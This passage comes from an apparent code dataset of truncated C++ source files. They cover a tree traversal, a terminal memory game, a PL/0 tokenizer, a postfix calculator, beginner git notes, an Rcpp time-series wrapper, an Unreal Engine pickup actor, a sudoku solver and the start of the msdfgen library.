niveis.front();\r\n        fila.pop();\r\n        niveis.pop();\r\n\r\n        if (nivelAtual == nivel) {\r\n            cout << atual->Item << \" \";\r\n            encontrou = true;\r\n        }\r\n\r\n        if (atual->Esq != NULL) {\r\n            fila.push(atual->Esq);\r\n            niveis.push(nivelAtual + 1);\r\n        }\r\n\r\n        if (atual->Dir != NULL) {\r\n            fila.push(atual->Dir);\r\n            niveis.push(nivelAtual + 1);\r\n        }\r\n    }\r\n\r\n    if (!encontrou) {\r\n        cout << \"Nivel \" << nivel << \" nao encontrado.\" << endl;\r\n    }\r\n\r\n    cout << endl;\r\n}\r\n",
    "// header\n#include \"memory_ui.hpp\"\n\n// local\n#include \"common.hpp\"\n#include \"slider_with_callback.hpp\"\n\n// std\n#include <algorithm>\n#include <chrono>\n#include <cmath>\n#include <future>\n#include <iterator>\n#include <mutex>\n#include <random>\n#include <thread>\n#include <vector>\n\nnamespace memory_game {\n\nMemoryUI::MemoryUI() {\n  create_dir(m_SaveDir);\n\n  m_Screen.SetCursor(ftxui::Screen::Cursor{\n      .x = 0, .y = 0, .shape = ftxui::Screen::Cursor::Hidden});\n\n  m_PlayerCount = m_pGameLogic->GetPlayerCount();\n}\n\n// Create all needed components and loop\nvoid MemoryUI::MainGame() {\n\n  // Main component stacking all the others\n  auto main_game_component = ftxui::Container::Stacked({\n      ftxui::Maybe(GetOptionsWindow() | ftxui::vcenter | ftxui::flex,\n                   &m_ShowOptions),\n\n      ftxui::Maybe(GetLoadWindow() | ftxui::align_right | ftxui::vcenter,\n                   [&] { return m_SaveList.size() > 0; }),\n\n      GetSaveWindow() | ftxui::vcenter,\n\n      ftxui::Maybe(GetShortcutsWindow(), &m_ShowShortcuts),\n\n      GameBoardUI() | HandleMemoryEvents(),\n\n      ftxui::Maybe(GetBackgroundComponent(), &m_AddBackground),\n  });\n\n  main_game_component |= HandleGlobalEvents();\n\n  // Update/draw component in loop\n  m_Screen.Loop(main_game_component);\n}\n\n// Handle game events and update game UI\nftxui::Component MemoryUI::GameBoardUI() const {\n  return ftxui::Renderer([this](bool focus) { return CreateUI(); });\n}\n\n// Handle global events (shortcuts)\nftxui::ComponentDecorator MemoryUI::HandleGlobalEvents() {\n  return ftxui::CatchEvent([this](ftxui::Event event) {\n    if (event == ftxui::Event::Character('q')) {\n      m_Screen.ExitLoopClosure()();\n      return true;\n    } else if (event == ftxui::Event::Character('r')) {\n      m_pGameLogic->InitializeBoard();\n      MessageAndStyleFromGameState();\n      return true;\n    } else if (event == ftxui::Event::Character('o')) {\n      m_ShowOptions = !m_ShowOptions;\n      return true;\n    }\n\n    return false;\n  });\n}\n\n// Handle game specific events (arrows and enter)\nftxui::ComponentDecorator MemoryUI::HandleMemoryEvents() {\n  return ftxui::CatchEvent([this](ftxui::Event event) {\n    if (event == ftxui::Event::ArrowUp) {\n      m_CurrentX--;\n      CheckBoundsXY();\n      return true;\n    }\n    if (event == ftxui::Event::ArrowDown) {\n      m_CurrentX++;\n      CheckBoundsXY();\n      return true;\n    }\n    if (event == ftxui::Event::ArrowRight) {\n      m_CurrentY++;\n      CheckBoundsXY();\n      return true;\n    }\n    if (event == ftxui::Event::ArrowLeft) {\n      m_CurrentY--;\n      CheckBoundsXY();\n      return true;\n    }\n\n    if (event == ftxui::Event::Return) {\n      m_pGameLogic->SelectCard(m_CurrentX, m_CurrentY);\n\n      MessageAndStyleFromGameState();\n\n      return true;\n    }\n\n    return false;\n  });\n}\n\n// Clamp m_CurrentX and m_CurrentY\nvoid MemoryUI::CheckBoundsXY() {\n  m_CurrentX =\n      std::clamp(m_CurrentX, 0, static_cast<std::int32_t>(m_BoardSize - 1));\n  m_CurrentY =\n      std::clamp(m_CurrentY, 0, static_cast<std::int32_t>(m_BoardSize - 1));\n}\n\n// Create static UI game element\nftxui::Element MemoryUI::CreateUI() const {\n  return ftxui::window(\n      ftxui::hbox({\n          ftxui::text(\"Memory Game\") | ftxui::color(ftxui::Color::Grey100) |\n              ftxui::bold,\n          ftxui::separator(),\n\n          ftxui::text(\n              \"Player's \" +\n              std::to_string(m_pGameLogic->GetCurrentPlayerIndex() + 1) +\n              \" turn\"),\n          ftxui::separator(),\n\n          ftxui::text(\"Player matched \"),\n          ftxui::text(std::to_string(m_pGameLogic->GetMatchedCardsCount(\n              m_pGameLogic->GetCurrentPlayerIndex()))) |\n              ftxui::blink,\n          ftxui::text(\" cards\"),\n          ftxui::separator(),\n\n          ftxui::text(\"Turn number: \" +\n                      std::to_string(m_pGameLogic->GetTurnNumber())),\n          ftxui::separator(),\n\n          ftxui::text(\"Board size: \" + std::to_string(m_BoardSize) + \"x\" +\n                      std::to_string(m_BoardSize)),\n          ftxui::separator(),\n\n          ftxui::text(\"Player count: \" +\n                      std::to_string(m_pGameLogic->GetPlayerCount())),\n          ftxui::separator(),\n\n          ftxui::text(m_Message) | m_TextStyle,\n      }) | ftxui::center,\n      CreateBoard(m_CurrentX, m_CurrentY));\n}\n\n// Create gridbox of cards\nftxui::Element MemoryUI::CreateBoard(const std::int32_t current_x,\n                                     const std::int32_t current_y) const {\n  std::vector<std::vector<ftxui::Element>> cells;\n  cells.resize(m_BoardSize, std::vector<ftxui::Element>(m_BoardSize));\n\n  for (int i = 0; i < m_BoardSize; ++i) {\n    for (int j = 0; j < m_BoardSize; ++j) {\n      ftxui::Element cell;\n      ftxui::Decorator color;\n\n      // Determine the content of the cell\n      if (m_pGameLogic->GetHasCardBeenRevealed()[i][j]) {\n        cell = ftxui::text(std::string(1, m_pGameLogic->GetBoard()[i][j]));\n        color = ftxui::color(ftxui::Color::White);\n      } else {\n        cell = ftx",
    "#include <utility>\n\n#include \"../include/keyword.hpp\"\n\nnamespace plc {\n\nToken::Token(TokenType type, std::string value): type_(type), value_(std::move(value)){}\n\nKeyWordInterpreter::KeyWordInterpreter(const std::vector<std::pair<TokenType, std::string>> &keyword_regex_pair): keyword_regex_pair_(keyword_regex_pair){}\n\nKeyWordInterpreter::KeyWordInterpreter(){\n    keyword_regex_pair_ = std::vector<std::pair<TokenType, std::string>>();\n    keyword_regex_pair_.emplace_back(TokenType::Keyword, \"(begin)|(end)|(if)|(then)|(while)|(do)|(procedure)|(call)|(const)|(var)|(odd)\");\n    keyword_regex_pair_.emplace_back(TokenType::Delimiter, \":=|\\\\.|;|,|\\\\(|\\\\)\");\n    keyword_regex_pair_.emplace_back(TokenType::Operator, \">=||<=|<>|>|=|<|\\\\+|-|/|\\\\*|#\");\n    keyword_regex_pair_.emplace_back(TokenType::Literal, \"([1-9]\\\\d*|0)\");\n    keyword_regex_pair_.emplace_back(TokenType::Identifier, \"([[:alpha:]])(\\\\w)*\");\n}\n\nResult<Token> KeyWordInterpreter::interpret(const std::string &input) const noexcept{\n    if (input.empty()) return Error<Token>(ErrorType::Empty);\n    using pair = std::pair<TokenType, std::string>;\n    for (const pair &pair : keyword_regex_pair_){\n        const auto &regex_str = std::get<std::string>(pair);\n        try{\n            std::regex regex(regex_str);\n            if (std::regex_match(input, regex)){\n                return Ok(Token(std::get<TokenType>(pair), input));\n            }\n        }catch (std::regex_error& e){\n            return Error<Token>(ErrorType::RegexError);\n        }\n    }\n    return Error<Token>(ErrorType::InvalidSyntax);\n}\n\nResult<Token> KeyWordInterpreter::interpretCheckAmbiguity(const std::string &input) const noexcept{\n    if (input.empty()) return Error<Token>(ErrorType::Empty);\n    using Pair = std::pair<TokenType, std::string>;\n    Result<Token> res(ErrorType::InvalidSyntax);\n    for (const Pair &pair : keyword_regex_pair_){\n        const auto &regex_str = std::get<std::string>(pair);\n        try{\n            std::regex regex(regex_str);\n            if (std::regex_match(input, regex)){\n                if (res.isOk) return Error<Token>(ErrorType::Ambiguity);\n                res = Ok(Token(std::get<TokenType>(pair), input));\n            }\n        }catch (std::regex_error& e){\n            return Error<Token>(ErrorType::RegexError);\n        }\n    }\n    return res;\n}\n\nResult<std::string> KeyWordInterpreter::splitString(const std::string &input) noexcept{\n    try{\n        std::regex patten = std::regex(\"([^a-zA-Z0-9_ ])([^a-zA-Z0-9_ ])\");\n        std::string res = std::regex_replace(input,patten,\"$1 $2\");\n        while (std::regex_replace(res,patten,\"$1 $2\") != res){\n            res = std::regex_replace(res,patten,\"$1 $2\");\n        }\n        patten = std::regex(\"([\\\\w])([^a-zA-Z0-9_ ])\");\n        while (res != std::regex_replace(res,patten,\"$1 $2\")){\n            res = std::regex_replace(res,patten,\"$1 $2\");\n        }\n        patten = std::regex(\"([^a-zA-Z0-9_ ])([\\\\w])\");\n        while (res != std::regex_replace(res,patten,\"$1 $2\")){\n            res = std::regex_replace(res,patten,\"$1 $2\");\n        }\n\n        patten = std::regex(\"(:|>|<) =\");\n        res = std::regex_replace(res,patten,\"$1=\");\n        patten = std::regex(\"< >\");\n        res = std::regex_replace(res,patten,\"<>\");\n        std::cout<<res<<std::endl;\n\n        return Ok(res);\n    }catch (std::regex_error& e){\n        return Error<std::string>(ErrorType::RegexError);\n    }\n}\n\nResult<std::vector<Token>> KeyWordInterpreter::interpretString(const std::string &input) const noexcept{\n    Result<std::string> spl = splitString(input);\n    if (!spl.isOk) {return Error<std::vector<Token>>(spl);}\n    std::stringstream stream(spl.unwrap());\n    std::string w;\n    std::vector<Token> res;\n    while (stream >> w){\n        Result<Token> token_res = interpret(w);\n        if (!token_res.isOk) return Error<std::vector<Token>>(token_res);\n        res.emplace_back(token_res.unwrap());\n    }\n    return Ok(res);\n}\n\nResult<std::vector<Token>> KeyWordInterpreter::interpretFile(const std::string &filename) const noexcept{\n    std::ifstream f(filename);\n    if (!f) return Result<std::vector<Token>>(ErrorType::IOError);\n    std::stringstream stream;\n    stream << f.rdbuf();\n    return interpretString(stream.str());\n}\n\nbool Token::operator==(const Token &other) const{\n    return (type_==other.type_ && value_==other.value_);\n}\n\nToken::operator std::string() const {\n        std::string type_str;\n        switch(type_){\n            case TokenType::Keyword:\n                type_str = \"Keyword\";\n                goto end;\n            case TokenType::Identifier:\n                type_str = \"Identifier\";\n                goto end;\n            case TokenType::Literal:\n                type_str = \"Literal\";\n                goto end;\n            case TokenType::Operator:\n                type_str = \"Operator\";\n                goto end;\n            case TokenType::Delimiter:\n                type_str = \"Delimiter\";\n                goto end;\n            case TokenType::E",
    "#include <iostream>\n#include <stack>\n#include <vector>\n#include <string>\n#include <sstream>\n#include <stdexcept>\n#include <cmath>\n#include <algorithm>\n#include <unordered_map>\n#include <functional>\n\n// Definimos Tokens como un vector de strings para almacenar los tokens de entrada\ntypedef std::vector<std::string> Tokens;\n// Mapa global para almacenar las variables definidas por el usuario\nstd::unordered_map<std::string, double> variables;\n// Mapa global para almacenar funciones definidas por el usuario\nstd::unordered_map<std::string, std::pair<int, std::function<double(const std::vector<double>&)>>> functions;\n\n// Tokeniza la entrada convirtiendo el string de entrada en un vector de tokens\nTokens tokenize(const std::string& input) {\n    Tokens tokens;\n    std::stringstream ss(input);\n    std::string token;\n    while (ss >> token) {\n        tokens.push_back(token);\n    }\n    return tokens;\n}\n\n// Evalua la expresion dada en notacion postfija\n// Utiliza una pila para manejar los operandos y operadores\ndouble evaluate(Tokens& tokens, std::unordered_map<std::string, double> localVariables = {}) {\n    std::stack<double> stack;\n\n    while (!tokens.empty()) {\n        std::string token = tokens.front();\n        tokens.erase(tokens.begin());\n\n        // Operadores aritm\u00e9ticos b\u00e1sicos\n        if (token == \"+\") {\n            if (stack.size() < 2) {\n                throw std::runtime_error(\"Operandos insuficientes para la suma\");\n            }\n            double b = stack.top(); stack.pop();\n            double a = stack.top(); stack.pop();\n            stack.push(a + b);\n        } else if (token == \"-\") {\n            if (stack.size() < 2) {\n                throw std::runtime_error(\"Operandos insuficientes para la resta\");\n            }\n            double b = stack.top(); stack.pop();\n            double a = stack.top(); stack.pop();\n            stack.push(a - b);\n        } else if (token == \"*\") {\n            if (stack.size() < 2) {\n                throw std::runtime_error(\"Operandos insuficientes para la multiplicacion\");\n            }\n            double b = stack.top(); stack.pop();\n            double a = stack.top(); stack.pop();\n            stack.push(a * b);\n        } else if (token == \"/\") {\n            if (stack.size() < 2) {\n                throw std::runtime_error(\"Operandos insuficientes para la division\");\n            }\n            double b = stack.top(); stack.pop();\n            double a = stack.top(); stack.pop();\n            if (b == 0) {\n                throw std::runtime_error(\"Division por cero\");\n            }\n            stack.push(a / b);\n        } else if (token == \"^\") {\n            if (stack.size() < 2) {\n                throw std::runtime_error(\"Operandos insuficientes para la potenciacion\");\n            }\n            double b = stack.top(); stack.pop();\n            double a = stack.top(); stack.pop();\n            stack.push(pow(a, b));\n        }\n        // Funciones matem\u00e1ticas comunes como sqrt, sin, cos, etc.\n        else if (token == \"sqrt\") {\n            if (stack.empty()) {\n                throw std::runtime_error(\"Operandos insuficientes para la raiz cuadrada\");\n            }\n            double a = stack.top(); stack.pop();\n            if (a < 0) {\n                throw std::runtime_error(\"La raiz cuadrada de un numero negativo no esta definida\");\n            }\n            stack.push(sqrt(a));\n        } else if (token == \"%\") {\n            if (stack.size() < 2) {\n                throw std::runtime_error(\"Operandos insuficientes para el modulo\");\n            }\n            double b = stack.top(); stack.pop();\n            double a = stack.top(); stack.pop();\n            if (b == 0) {\n                throw std::runtime_error(\"Division por cero\");\n            }\n            stack.push(fmod(a, b));\n        }\n        // Funcion para obtener el valor absoluto\n        else if (token == \"abs\") {\n            if (stack.empty()) {\n                throw std::runtime_error(\"Operandos insuficientes para el valor absoluto\");\n            }\n            double a = stack.top(); stack.pop();\n            stack.push(std::abs(a));\n        }\n        // Otros operadores matem\u00e1ticos y funciones trigonom\u00e9tricas\n        else if (token == \"sin\") {\n            if (stack.empty()) {\n                throw std::runtime_error(\"Operandos insuficientes para el seno\");\n            }\n            double a = stack.top(); stack.pop();\n            stack.push(std::sin(a));\n        } else if (token == \"cos\") {\n            if (stack.empty()) {\n                throw std::runtime_error(\"Operandos insuficientes para el coseno\");\n            }\n            double a = stack.top(); stack.pop();\n            stack.push(std::cos(a));\n        } else if (token == \"tan\") {\n            if (stack.empty()) {\n                throw std::runtime_error(\"Operandos insuficientes para la tangente\");\n            }\n            double a = stack.top(); stack.pop();\n            stack.push(std::tan(a));\n        } else if (token == \"asin\") {\n            if (stack.empty",
    "#include <iostream>\nusing namespace std;\n\nint main(){\n    cout<<\"Hello World\";\n    return 0;\n}\n\n\n// NoTes\n\n/*\nTO CHECK VERSION\n1. git --version\n\n\nSETUP\n\n1. git config --global user.name \u201c[firstname lastname]\u201d\n\n2.  git config --global user.email \u201c[valid-email]\u201d\n\n3. shows credentials entered\ngit config --list\n\n\n\nCLONE AND STATUS\n\n1. git clone <-some link->\n\n2. displays the state of code..\ngit status\n\n3. diffrent status\n\nuntracked\nnew files that git doesn't yet track\n\nmodified\nchanged\n\nstaged\nfile is ready to be committed\n\nunmodified\nunchanged\n\n\n\n\nADD and COMMIT\n\n\n1. add - adds new or changed files in your working directory to the Git staging area.\ngit add <- file name ->\n\n2. commit - it is the record of change\ngit commit -m \"some message\"\n\n\nPUSH COMMAND\n\n1. push - upload local repo content to remote repo\ngit push origin main\n\nORIGIN is a name of copy of the repo\nMAIN is the branch name\n\nINIT COMMAND\n\ninit - used to create a new git repo\n\n1. initialize an existing directory as a Git repository\ngit init\n\n2. if you create another repo in local systum \ngit remote add origin <-link->\n\n3.\ngit remote -v (to verify remote)\n\n\n\nBRANCH\n\n1.\ngit branch\n\n2.\ngit branch -M main (to rename branch)\n\n\n3.\ngit push origin main\n\n\n\n\nTERMINAL COMMANDS\n\n1. cd\n2. cd <file name>\n3. clear - clears screen\n4. ls - lists all folders\n5. ls -a -> list all folders and hidden folders as well\n6. cd .. -> to come out of folder\n7. mkdir <folder name> -> to make a new folder\n\n*/",
    "// [[Rcpp::depends(RcppArmadillo)]] \n#include <RcppArmadillo.h>\nusing namespace arma;\nusing namespace std;\nusing namespace Rcpp;\n#include \"MSOEmodel.h\"\n#include \"INTLEVELmodel.h\"\n\n// [[Rcpp::export]]\nSEXP MSOEc(SEXP commands, SEXP ys, SEXP us, SEXP models, SEXP periodss, SEXP rhoss,\n           SEXP hs, SEXP tTests, SEXP criterions, SEXP ps, SEXP rubbish2s, SEXP rubbishs,\n           SEXP verboses, SEXP stepwises, SEXP estimOks,\n           SEXP p0s, SEXP vs, SEXP yFitVs, SEXP nonStationaryTermss,\n           SEXP rubbish3s, SEXP harmonicss, SEXP criterias, SEXP cycleLimitss, \n           SEXP betass, SEXP typeOutlierss, SEXP TVPs, SEXP trendOptionss,\n           SEXP seasonalOptionss, SEXP irregularOptionss){\n    // setbuf(stdout, NULL);\n    // Converting R inputs to C++\n    string command = CHAR(STRING_ELT(commands, 0));\n    NumericVector yr(ys);\n    NumericMatrix ur(us);\n    string model = CHAR(STRING_ELT(models, 0));\n    NumericVector periodsr(periodss);\n    NumericVector rhosr(rhoss);\n    int h = as<int>(hs);\n    bool tTest = as<bool>(tTests);\n    string criterion = CHAR(STRING_ELT(criterions, 0));\n    NumericVector pr(ps);\n    NumericVector rubbishr(rubbishs);\n    bool verbose = as<bool>(verboses);\n    bool stepwise = as<bool>(stepwises);\n    string estimOk = CHAR(STRING_ELT(estimOks, 0));\n    NumericVector p0r(p0s);\n    NumericVector vr(vs);\n    NumericVector yFitVr(yFitVs);\n    int nonStationaryTerms = as<int>(nonStationaryTermss);\n    NumericVector harmonicsr(harmonicss);\n    NumericVector criteriar(criterias);\n    NumericMatrix rubbish2r(rubbish2s);\n    NumericMatrix rubbish3r(rubbish3s);\n    NumericMatrix betar(betass);\n    NumericMatrix typeOutliersr(typeOutlierss);\n    NumericVector TVPr(TVPs);\n    string trendOptions = CHAR(STRING_ELT(trendOptionss, 0));\n    string seasonalOptions = CHAR(STRING_ELT(seasonalOptionss, 0));\n    string irregularOptions = CHAR(STRING_ELT(irregularOptionss, 0));\n    \n    vec y(yr.begin(), yr.size(), false);\n    mat u(ur.begin(), ur.nrow(), ur.ncol(), false);\n    vec periods(periodsr.begin(), periodsr.size(), false);\n    vec rhos(rhosr.begin(), rhosr.size(), false);\n    vec p(pr.begin(), pr.size(), false);\n    vec p0(p0r.begin(), p0r.size(), false);\n    vec v(vr.begin(), vr.size(), false);\n    vec yFitV(yFitVr.begin(), yFitVr.size(), false);\n    vec harmonics(harmonicsr.begin(), harmonicsr.size(), false);\n    vec criteria(criteriar.begin(), criteriar.size(), false);\n    vec rubbish(rubbishr.begin(), rubbishr.size(), false);\n    mat rubbish2(rubbish2r.begin(), rubbish2r.nrow(), rubbish2r.ncol(), false);\n    mat rubbish3(rubbish3r.begin(), rubbish3r.nrow(), rubbish3r.ncol(), false);\n    mat betas(betar.begin(), betar.nrow(), betar.ncol(), false);\n    mat typeOutliers(typeOutliersr.begin(), typeOutliersr.nrow(), typeOutliersr.ncol(), false);\n    vec TVP(TVPr.begin(), TVPr.size(), false);\n    \n    // Correcting dimensions of u (k x n)\n    size_t k = u.n_rows;\n    size_t n = u.n_cols;\n    if (k > n){\n        u = u.t();\n    }\n    if (k == 1 && n == 2){\n        u.resize(0);\n    }\n    if (typeOutliers(0, 0) == -1){\n        typeOutliers.reset();\n    }\n    double outlier = rubbish(4);\n    double lambda = rubbish(8);\n    vec pp(2); pp(0) = periods.n_elem * 2 + 2; pp(1) = sum(rubbish3.col(0));\n    int iniObs = max(pp);\n    // int iniObs;\n    // Setting inputs\n    SSinputs inputsSS;\n    BSMmodel inputsBSM;\n    // Pre-processing\n    bool errorExit = preProcess(y, u, model, h, outlier, criterion, periods, p0, iniObs,\n                                trendOptions, seasonalOptions, irregularOptions, TVP, lambda);\n    if (errorExit)\n        return List::create(Named(\"model\") = \"error\");\n    if (sum(TVP) > 0)\n        outlier = 0;\n    // End of pre-processing\n    if (command == \"estimate\"){\n        inputsSS.y = y.rows(iniObs, y.n_elem - 1);\n    } else {\n        inputsSS.y = y;\n    }\n    mat uIni;\n    if (iniObs > 0 && u.n_rows > 0 && command == \"estimate\"){\n        inputsSS.u = u.cols(iniObs, u.n_cols - 1);\n        uIni = u.cols(0, iniObs - 1);\n    } else {\n        inputsSS.u= u;\n    }\n    inputsBSM.model = model;\n    inputsBSM.periods = periods;\n    inputsBSM.rhos = rhos;\n    inputsSS.h = h;\n    inputsBSM.tTest = tTest;\n    inputsBSM.criterion = criterion;\n    //if (TVP(0) == -9999.99)\n    //    TVP = {};\n    inputsBSM.TVP = TVP;\n    inputsBSM.MSOE = rubbish(9);\n    inputsBSM.PTSnames = rubbish(10);\n    inputsBSM.trendOptions = trendOptions;\n    inputsBSM.seasonalOptions = seasonalOptions;\n    inputsBSM.irregularOptions = irregularOptions;\n    inputsSS.grad = rubbish2.col(0);\n    inputsSS.p = p;\n    inputsSS.p0 = p0;\n    inputsSS.v = v;\n    inputsSS.F = yFitV;\n    inputsSS.d_t = rubbish(0);\n    inputsSS.innVariance = rubbish(1);\n    inputsSS.objFunValue = rubbish(2);\n    inputsSS.cLlik = rubbish(3);\n    inputsSS.outlier = outlier;\n    // vec aux(1); aux(0) = inputsSS.outlier;\n    // if (aux.has_nan()){\n    //     inputsSS.outlier = 0;\n    // }\n    inputsSS.Iter = rubbish(6);\n    inputsSS.verb",
    "// Copyright (c) 2024 Michael Greenard. All rights reserved.\n\n#include \"WarwolfTestPickup.h\"\n#include \"Components/BoxComponent.h\"\n#include \"WarwolfMissionTagComponent.h\"\n#include \"Engine/World.h\"\n#include \"GameFramework/Pawn.h\"\n\nDEFINE_LOG_CATEGORY(LogWarwolfMissionTest);\n\n// Sets default values\nAWarwolfTestPickup::AWarwolfTestPickup()\n{\n\t// Set this actor to call Tick() every frame. You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\t\n\tBoxComponent = CreateDefaultSubobject<UBoxComponent>(TEXT(\"BoxComponent\"));\n\tcheck(BoxComponent);\n\tBoxComponent->SetBoxExtent(FVector(50.f, 50.f, 50.f));\n\tBoxComponent->SetCollisionProfileName(TEXT(\"Trigger\"));\n\tBoxComponent->SetCollisionEnabled(ECollisionEnabled::NoCollision);\n\tRootComponent = BoxComponent;\n\t\n\tMissionTagComponent = CreateDefaultSubobject<UWarwolfMissionTagComponent>(TEXT(\"MissionTagComponent\"));\n}\n\n// Called when the game starts or when spawned\nvoid AWarwolfTestPickup::BeginPlay()\n{\n\tSuper::BeginPlay();\n}\n\n// Called every frame\nvoid AWarwolfTestPickup::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n}\n\nvoid AWarwolfTestPickup::OnOverlapBegin(UPrimitiveComponent* OverlappedComponent, AActor* OtherActor, UPrimitiveComponent* OtherComp, int32 OtherBodyIndex, bool bFromSweep, const FHitResult& SweepResult)\n{\n\tconst UWorld* World = GetWorld();\n\tif (!World)\n\t{\n\t\tUE_LOG(LogWarwolfMissionTest, Error, TEXT(\"%s World is invalid. Returning.\"), *FString(__FUNCTION__));\n\t\treturn;\n\t}\n\t\n\tconst APlayerController* PlayerController = World->GetFirstPlayerController();\n\tif (!PlayerController)\n\t{\n\t\tUE_LOG(LogWarwolfMissionTest, Error, TEXT(\"%s PlayerController is invalid. Returning.\"), *FString(__FUNCTION__));\n\t\treturn;\n\t}\n\n\tconst APawn* PlayerPawn = PlayerController->GetPawn();\n\tconst APawn* OtherActorPawn = Cast<APawn>(OtherActor);\n\t\n\tif (!OtherActorPawn || OtherActorPawn != PlayerPawn) return;\n\n\tOnIntCountDelegate.Broadcast();\n\tOverlappedPlayer();\n}\n\nvoid AWarwolfTestPickup::ActivateMissionActor_Implementation()\n{\n\tif (!BoxComponent)\n\t{\n\t\tUE_LOG(LogWarwolfMissionTest, Error, TEXT(\"%s BoxComponent is invalid. Returning.\"), *FString(__FUNCTION__));\n\t\treturn;\n\t}\n\n\tBoxComponent->SetCollisionEnabled(ECollisionEnabled::QueryOnly);\n\t\n\tif (BoxComponent->OnComponentBeginOverlap.IsAlreadyBound(this, &AWarwolfTestPickup::OnOverlapBegin))\n\t{\n\t\tUE_LOG(LogWarwolfMissionTest, Error, TEXT(\"%s BoxComponent overlaps are already bound. Why are we trying to do this again? Returning.\"), *FString(__FUNCTION__));\n\t\treturn;\n\t}\n\t\n\tBoxComponent->OnComponentBeginOverlap.AddDynamic(this, &AWarwolfTestPickup::OnOverlapBegin);\n}\n\nvoid AWarwolfTestPickup::DeactivateMissionActor_Implementation()\n{\n\tif (!BoxComponent)\n\t{\n\t\tUE_LOG(LogWarwolfMissionTest, Error, TEXT(\"%s BoxComponent is invalid. Returning.\"), *FString(__FUNCTION__));\n\t\treturn;\n\t}\n\t\n\tBoxComponent->SetCollisionEnabled(ECollisionEnabled::NoCollision);\n\tBoxComponent->OnComponentBeginOverlap.RemoveDynamic(this, &AWarwolfTestPickup::OnOverlapBegin);\n}\n\n",
    "#include <iostream>\n#include <vector>\n\nusing namespace std;\n\n#define N 9\n\n// Function to print the Sudoku grid with box structure\nvoid printGrid(const vector<vector<int>>& grid) {\n    for (int i = 0; i < N; i++) {\n        if (i % 3 == 0 && i != 0) {\n            cout << \"------+-------+------\" << endl; // Line separating boxes\n        }\n        for (int j = 0; j < N; j++) {\n            if (j % 3 == 0 && j != 0) {\n                cout << \"| \"; // Vertical line separating boxes\n            }\n            cout << grid[i][j] << \" \";\n        }\n        cout << endl;\n    }\n}\n\n// Check if it's safe to place a number in the given row, column\nbool isSafe(const vector<vector<int>>& grid, int row, int col, int num) {\n    // Check if the number is not in the current row and column\n    for (int x = 0; x < N; x++) {\n        if (grid[row][x] == num || grid[x][col] == num) {\n            return false;\n        }\n    }\n\n    // Check the 3x3 box\n    int startRow = row - row % 3, startCol = col - col % 3;\n    for (int i = 0; i < 3; i++) {\n        for (int j = 0; j < 3; j++) {\n            if (grid[i + startRow][j + startCol] == num) {\n                return false;\n            }\n        }\n    }\n\n    return true;\n}\n\n// Backtracking function to solve the Sudoku puzzle\nbool solveSudoku(vector<vector<int>>& grid) {\n    int row, col;\n    bool empty = true;\n\n    // Find an empty space in the grid\n    for (row = 0; row < N; row++) {\n        for (col = 0; col < N; col++) {\n            if (grid[row][col] == 0) { // 0 means empty cell\n                empty = false;\n                break;\n            }\n        }\n        if (!empty) break;\n    }\n\n    // If no empty space is found, the puzzle is solved\n    if (empty) return true;\n\n    // Try numbers from 1 to 9\n    for (int num = 1; num <= N; num++) {\n        if (isSafe(grid, row, col, num)) {\n            grid[row][col] = num; // Place the number\n\n            // Recursively try to solve the rest of the puzzle\n            if (solveSudoku(grid)) return true;\n\n            // If it didn't work out, reset and try next number\n            grid[row][col] = 0;\n        }\n    }\n\n    return false; // Trigger backtracking\n}\n\nint main() {\n    vector<vector<int>> grid(N, vector<int>(N));\n\n    cout << \"Enter the Sudoku puzzle (use 0 for empty cells):\" << endl;\n\n    // Input the Sudoku puzzle\n    for (int i = 0; i < N; i++) {\n        for (int j = 0; j < N; j++) {\n            cin >> grid[i][j];\n        }\n    }\n\n    if (solveSudoku(grid)) {\n        cout << \"Solved Sudoku:\" << endl;\n        printGrid(grid);\n    } else {\n        cout << \"No solution exists.\" << endl;\n    }\n\n    return 0;\n}",
    "\n/*\n * MULTI-CHANNEL SIGNED DISTANCE FIELD GENERATOR\n * ---------------------------------------------\n * https://github.com/Chlumsky/msdfgen\n *\n * MIT License\n * \n * Copyright (c) 2014 - 2024 Viktor Chlumsky\n * \n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n * \n * The above copyright notice and this permission notice shall be included in all\n * copies or substantial portions of the Software.\n * \n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n * SOFTWARE.\n *\n */\n\n#ifndef _CRT_SECURE_NO_WARNINGS\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"msdfgen.h\"\n\n#include <queue>\n\n#ifdef MSDFGEN_USE_FREETYPE\n#include <ft2build.h>\n#include FT_FREETYPE_H\n#include FT_OUTLINE_H\n#ifndef MSDFGEN_DISABLE_VARIABLE_FONTS\n#include FT_MULTIPLE_MASTERS_H\n#endif\n#endif\n\n#if defined(__GNUC__) || defined(__clang__)\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wshadow\"\n#elif defined(_MSC_VER)\n#pragma warning(push)\n#pragma warning(disable : 4456 4457 4458 6246)\n#endif\n\n#ifndef M_PI\n#define M_PI 3.1415926535897932384626433832795\n#endif\n\n#ifdef MSDFGEN_PARENT_NAMESPACE\nnamespace MSDFGEN_PARENT_NAMESPACE {\n#endif\n\n#ifndef MSDFGEN_CUBE_ROOT\n#define MSDFGEN_CUBE_ROOT(x) pow((x), 1/3.)\n#endif\n\nnamespace msdfgen {\n\nint solveQuadratic(double x[2], double a, double b, double c) {\n    // a == 0 -> linear equation\n    if (a == 0 || fabs(b) > 1e12*fabs(a)) {\n        // a == 0, b == 0 -> no solution\n        if (b == 0) {\n            if (c == 0)\n                return -1; // 0 == 0\n            return 0;\n        }\n        x[0] = -c/b;\n        return 1;\n    }\n    double dscr = b*b-4*a*c;\n    if (dscr > 0) 